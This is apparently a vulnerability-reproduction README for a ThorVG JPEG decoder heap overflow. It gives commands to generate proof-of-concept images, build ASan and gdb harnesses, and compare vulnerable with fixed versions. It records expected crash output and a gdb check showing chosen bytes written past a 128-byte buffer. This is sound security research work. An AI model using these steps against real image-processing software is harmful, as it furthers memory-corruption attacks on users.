# Replay — thorvg2shell

From this directory, with g++ 13.3.0, clang 18.1.3, Python 3.12.3 + PIL 10.2.0,
gdb and ASan installed:


The extracted `src/vuln/` and `src/fixed/` trees are gitignored bulk; recreate
them from the pinned tarballs first:

```sh
mkdir -p src/vuln src/fixed
tar xzf src/v1.1.1.tar.gz -C src/vuln --strip-components=1
tar xzf src/v1.1.2.tar.gz -C src/fixed --strip-components=1
sha256sum -c PINS.sha256
```

Then, from the same directory:
```sh
python3 poc/make_poc.py
python3 poc/make_large.py
python3 poc/make_marker.py
python3 - <<'PY'
import hashlib, pathlib
for p in sorted(pathlib.Path('poc').glob('*.jpg')):
    print(p.name, hashlib.sha256(p.read_bytes()).hexdigest())
PY
sh harness/build.sh
for cc in g++ clang++; do
  tag=$(basename "$cc" | tr -d '+')
  "$cc" -std=c++17 -g -O0 -fno-omit-frame-pointer -fsanitize=address \
    -Iharness -Isrc/vuln/inc -Isrc/vuln/src/common -Isrc/vuln/src/loaders/jpg \
    harness/jpgd_asan.cpp harness/tvgJpgd_directalloc.cpp \
    -o "harness/bin/${tag}-vuln-allocinstr-asan"
done
g++ -std=c++17 -g -O0 -fno-omit-frame-pointer \
  -Iharness -Isrc/vuln/inc -Isrc/vuln/src/common -Isrc/vuln/src/loaders/jpg \
  harness/jpgd_asan.cpp harness/tvgJpgd_directalloc.cpp \
  -o harness/bin/g-vuln-allocinstr-plain
sh harness/run_matrix.sh
```

Expected:
- Every control JPEG: rc 0 on both vulnerable and fixed trees.
- `dup2/3/4.jpg`, `dup4_large.jpg`, `marker_dup4.jpg` on every fixed binary:
  rc 6 (`decompress: pixels=(nil)`).
- `dup4.jpg` on `g-vuln-allocinstr-asan` and `clang-vuln-allocinstr-asan`:
  `heap-buffer-overflow`, `WRITE of size 2`, 0 bytes after a 128-byte region
  allocated at `init_frame()`, top frame `decode_next_row()` at
  `tvgJpgd_directalloc.cpp:1453`.
- `dup4_large.jpg` on pristine vulnerable binaries: SEGV in `huff_decode()`
  at pinned `tvgJpgd.cpp:733` under ASan, rc 139 without ASan; fixed: rc 6.

Chosen-byte check (rung 4):

```sh
gdb -q -batch \
  -ex 'break tvgJpgd_directalloc.cpp:1453 if mcu_block >= 1' \
  -ex 'run poc/marker_dup4.jpg' \
  -ex 'next' \
  -ex 'printf "block=%d offset=%ld\n", mcu_block, p - m_pMCU_coefficients' \
  -ex 'x/2xb p' \
  -ex 'continue' -ex 'next' -ex 'x/2xb p' \
  -ex 'continue' -ex 'next' -ex 'x/2xb p' \
  ./harness/bin/g-vuln-allocinstr-plain
```

Expected: offsets 64/128/192 int16 units (128/256/384 bytes) with bytes
`58 00`, `68 00`, `78 00` respectively, from a 128-byte allocation.

Pins: `sha256sum -c PINS.sha256` (includes the generator scripts and source
files; binaries and per-case transcripts are reproducible, not pinned there).
